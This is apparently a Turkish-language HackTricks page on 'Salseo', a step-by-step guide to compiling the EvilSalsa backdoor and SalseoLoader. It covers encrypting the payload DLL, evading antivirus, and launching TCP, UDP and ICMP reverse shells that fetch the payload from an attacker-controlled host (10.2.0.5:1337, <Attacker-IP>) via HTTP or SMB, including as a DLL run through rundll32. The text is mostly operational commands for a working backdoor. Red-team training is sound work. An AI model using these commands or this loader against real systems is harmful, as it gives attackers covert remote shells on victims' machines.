# Salseo

<details>

<summary><strong>AWS hacklemeyi sıfırdan kahramana öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> ile!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamınızı görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**]'na göz atın (https://github.com/sponsors/carlospolop)!
* [**Resmi PEASS & HackTricks ürünlerini alın**](https://peass.creator-spring.com)
* [**The PEASS Family**]'yi keşfedin (https://opensea.io/collection/the-peass-family), özel [**NFT'lerimiz**] koleksiyonumuz (https://opensea.io/collection/the-peass-family)
* **Katılın** 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya bizi **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'da takip edin.**
* **Hacking püf noktalarınızı paylaşarak PR'ler göndererek HackTricks** (https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına.

</details>

## Derlemeleri Derleme

Kaynak kodunu github'dan indirin ve **EvilSalsa** ve **SalseoLoader**'ı derleyin. Kodu derlemek için **Visual Studio**'nun yüklü olması gerekecektir.

Bu projeleri, kullanacak olduğunuz Windows işletim sisteminin mimarisi için derleyin (Windows x64'ü destekliyorsa, o mimari için derleyin).

Mimariyi Visual Studio içinde **sol "Build" sekmesindeki** **"Platform Target"** bölümünden **seçebilirsiniz.**

(\*\*Bu seçenekleri bulamazsanız, **"Project Tab"** üzerine tıklayın ve ardından **"\<Project Name> Properties"**'e tıklayın)

![](<../.gitbook/assets/image (839).png>)

Sonra, her iki projeyi derleyin (Build -> Build Solution) (Log içinde yürütülebilir dosyanın yolunu göreceksiniz):

![](<../.gitbook/assets/image (381).png>)

## Arka Kapıyı Hazırlama

Öncelikle, **EvilSalsa.dll**'yi şifrelemeniz gerekecektir. Bunun için, **encrypterassembly.py** adlı python betiğini kullanabilir veya **EncrypterAssembly** projesini derleyebilirsiniz:

### **Python**
```
python EncrypterAssembly/encrypterassembly.py <FILE> <PASSWORD> <OUTPUT_FILE>
python EncrypterAssembly/encrypterassembly.py EvilSalsax.dll password evilsalsa.dll.txt
```
### Windows
```
EncrypterAssembly.exe <FILE> <PASSWORD> <OUTPUT_FILE>
EncrypterAssembly.exe EvilSalsax.dll password evilsalsa.dll.txt
```
Şimdi Salseo işlemini gerçekleştirmek için ihtiyacınız olan her şeye sahipsiniz: **şifrelenmiş EvilDalsa.dll** ve **SalseoLoader'ın ikili dosyası.**

**SalseoLoader.exe ikili dosyasını makineye yükleyin. Herhangi bir AV tarafından tespit edilmemeleri gerekiyor...**

## **Arka kapıyı çalıştırın**

### **TCP ters kabuk almak (şifrelenmiş dll'yi HTTP aracılığıyla indirme)**

Ters kabuk dinleyici olarak nc'yi başlatmayı ve şifrelenmiş evilsalsa'yı sunmak için bir HTTP sunucusu başlatmayı unutmayın.
```
SalseoLoader.exe password http://<Attacker-IP>/evilsalsa.dll.txt reversetcp <Attacker-IP> <Port>
```
### **Bir UDP ters kabuk almak (SMB üzerinden kodlanmış dll indirme)**

Ters kabuk dinleyici olarak nc'yi başlatmayı ve kodlanmış evilsalsa'yı sunmak için bir SMB sunucusu başlatmayı unutmayın (impacket-smbserver).
```
SalseoLoader.exe password \\<Attacker-IP>/folder/evilsalsa.dll.txt reverseudp <Attacker-IP> <Port>
```
### **ICMP ters kabuk almak (şifrelenmiş dll zaten kurbanın içinde)**

**Bu sefer ters kabuk almak için istemci tarafında özel bir araca ihtiyacınız var. İndirin:** [**https://github.com/inquisb/icmpsh**](https://github.com/inquisb/icmpsh)

#### **ICMP Yanıtlarını Devre Dışı Bırakın:**
```
sysctl -w net.ipv4.icmp_echo_ignore_all=1

#You finish, you can enable it again running:
sysctl -w net.ipv4.icmp_echo_ignore_all=0
```
#### Müşteriyi çalıştırın:
```
python icmpsh_m.py "<Attacker-IP>" "<Victm-IP>"
```
#### Kurbanın içinde, salseo şeyini çalıştıralım:
```
SalseoLoader.exe password C:/Path/to/evilsalsa.dll.txt reverseicmp <Attacker-IP>
```
## SalseoLoader'ı ana işlevi dışa aktaran DLL olarak derleme

Visual Studio kullanarak SalseoLoader projesini açın.

### Ana işlevin önüne ekle: \[DllExport]

![](<../.gitbook/assets/image (409).png>)

### Bu projeye DllExport yükleyin

#### **Araçlar** --> **NuGet Paket Yöneticisi** --> **Çözüm İçin NuGet Paketlerini Yönet...**

![](<../.gitbook/assets/image (881).png>)

#### **DllExport paketini arayın (Gözat sekmesini kullanarak) ve Yükle'yi seçin (ve açılan pencereyi kabul edin)**

![](<../.gitbook/assets/image (100).png>)

Projeler klasörünüzde **DllExport.bat** ve **DllExport\_Configure.bat** dosyaları görünecektir.

### DllExport'u kaldırın

**Kaldır**'ı seçin (evet, tuhaf ama bana güvenin, gerekli)

![](<../.gitbook/assets/image (97).png>)

### Visual Studio'yu kapatın ve DllExport\_configure'ı çalıştırın

Sadece Visual Studio'yu **kapatın**

Daha sonra, **SalseoLoader klasörüne** gidin ve **DllExport\_Configure.bat**'ı çalıştırın

**x64**'ü seçin (bir x64 kutusunda kullanacaksanız), **System.Runtime.InteropServices**'i seçin (**DllExport için Namespace** içinde) ve **Uygula**'yı seçin

![](<../.gitbook/assets/image (882).png>)

### Projeyi tekrar Visual Studio ile açın

**\[DllExport]** artık hata olarak işaretlenmemelidir

![](<../.gitbook/assets/image (670).png>)

### Çözümü derleyin

**Çıkış Türü = Sınıf Kütüphanesi**'ni seçin (Proje --> SalseoLoader Özellikleri --> Uygulama --> Çıkış türü = Sınıf Kütüphanesi)

![](<../.gitbook/assets/image (847).png>)

**x64 platformunu** seçin (Proje --> SalseoLoader Özellikleri --> Derleme --> Platform hedefi = x64)

![](<../.gitbook/assets/image (285).png>)

Çözümü derlemek için: Derle --> Çözümü Derle (Çıktı konsolunda yeni DLL'nin yolu görünecektir)

### Oluşturulan Dll'yi test edin

Dll'yi test etmek istediğiniz yere kopyalayın ve yapıştırın.

Çalıştır:
```
rundll32.exe SalseoLoader.dll,main
```
Eğer hata görünmüyorsa, muhtemelen işlevsel bir DLL'niz var!!

## DLL kullanarak bir kabuk alın

Bir **HTTP** **sunucusu** kullanmayı ve bir **nc** **dinleyici** ayarlamayı unutmayın

### Powershell
```
$env:pass="password"
$env:payload="http://10.2.0.5/evilsalsax64.dll.txt"
$env:lhost="10.2.0.5"
$env:lport="1337"
$env:shell="reversetcp"
rundll32.exe SalseoLoader.dll,main
```
### CMD

### CMD
```
set pass=password
set payload=http://10.2.0.5/evilsalsax64.dll.txt
set lhost=10.2.0.5
set lport=1337
set shell=reversetcp
rundll32.exe SalseoLoader.dll,main
```
<details>

<summary><strong>Sıfırdan kahraman olmaya kadar AWS hacklemeyi öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerini alın**](https://peass.creator-spring.com)
* [**The PEASS Family'yi**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* **Katılın** 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya bizi **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'da takip edin.**
* **Hacking püf noktalarınızı paylaşarak PR göndererek HackTricks** ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.

</details>
